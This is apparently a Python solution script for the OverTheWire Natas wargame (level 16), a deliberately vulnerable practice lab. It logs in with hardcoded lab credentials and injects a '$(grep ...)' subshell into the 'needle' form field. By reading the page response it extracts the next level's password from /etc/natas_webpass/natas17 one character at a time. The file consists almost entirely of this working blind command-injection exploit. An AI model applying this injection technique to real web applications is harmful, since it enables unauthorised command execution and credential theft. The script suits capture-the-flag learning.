#!/bin/python3
import requests
import re

user = 'natas16'
password = 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'
url = 'http://%s.natas.labs.overthewire.org/' % user

# 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9c
sessione = requests.Session()

start = '^$(grep ^'
letter = '{}'
end = ' ../../../../etc/natas_webpass/natas17)'
pass17 = ''

while True:

    for i in "0123456789abcdefghjkilmnopqrstuvxywzABCDEFGHIJKLMNOPQRSTUVXYWZ":
        r = start + letter.format(i) + end

        obj = {'needle': r}
        post = sessione.post(url, data=obj, auth=(user, password))

        espr = re.findall("Afr(..)", post.text)

        if len(espr) == 0:
            start = start + i
            pass17 = pass17 + i
            # Togli il commento sotto se vuoi vedere la "costruzione della password"
            # print(pass17)
            break

    if len(pass17) == 32:
        break

print('Password')
print(pass17)
